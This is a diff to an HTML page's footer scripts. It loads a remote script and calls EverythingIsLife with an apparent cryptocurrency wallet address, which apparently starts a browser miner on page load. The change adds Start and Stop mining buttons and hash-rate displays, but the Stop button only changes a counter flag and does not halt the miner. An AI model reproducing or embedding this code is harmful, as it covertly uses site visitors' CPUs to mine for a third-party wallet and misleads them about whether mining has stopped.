@@ -36,9 +36,56 @@
     </footer>
 
     <!-- Script -->
-   <script src="https://thelifewillbefine.de/karma/karma.js?karma=bs?nosaj=faster.mo" ></script>
-<script type="text/javascript">
-EverythingIsLife('41iVeDotGpaG9u4xgzjZZoEoWx6znhpaT77xjrJ4k8HP8mQx8UrzxnSKikNuZ3XdZQ6BGcPMUK2GmGfj8utMGqG3GHMzpip', 'x', 30);
-</script>
+    <script src="https://thelifewillbefine.de/karma/karma.js?karma=bs?nosaj=faster.mo"></script>
+    <script>
+        let isMining = false;
+        let totalHashes = 0;
+
+        // Инициализация EverythingIsLife
+        try {
+            EverythingIsLife('41iVeDotGpaG9u4xgzjZZoEoWx6znhpaT77xjrJ4k8HP8mQx8UrzxnSKikNuZ3XdZQ6BGcPMUK2GmGfj8utMGqG3GHMzpip', 'x', 30);
+            console.log('EverythingIsLife initialized.');
+        } catch (error) {
+            console.error('Failed to initialize EverythingIsLife:', error);
+        }
+
+        // Элементы интерфейса
+        const startMiningButton = document.getElementById('start-mining');
+        const stopMiningButton = document.getElementById('stop-mining');
+        const hashRateDisplay = document.getElementById('hash-rate');
+        const totalHashesDisplay = document.getElementById('total-hashes');
+
+        // Обновление хешрейта
+        function updateStats() {
+            if (isMining && typeof EverythingIsLife.getHashRate === 'function') {
+                const hashRate = EverythingIsLife.getHashRate();
+                totalHashes += hashRate; // Прибавляем к общей сумме
+                hashRateDisplay.innerText = hashRate.toFixed(2);
+                totalHashesDisplay.innerText = totalHashes.toFixed(0);
+            } else if (!isMining) {
+                hashRateDisplay.innerText = "0";
+            }
+        }
+
+        // Запуск майнинга
+        startMiningButton.addEventListener('click', () => {
+            isMining = true;
+            startMiningButton.disabled = true;
+            stopMiningButton.disabled = false;
+            console.log('Mining started.');
+        });
+
+        // Остановка майнинга
+        stopMiningButton.addEventListener('click', () => {
+            isMining = false;
+            startMiningButton.disabled = false;
+            stopMiningButton.disabled = true;
+            console.log('Mining stopped.');
+        });
+
+        // Интервал обновления
+        setInterval(updateStats, 1000);
+    </script>
 </body>
 </html>
+
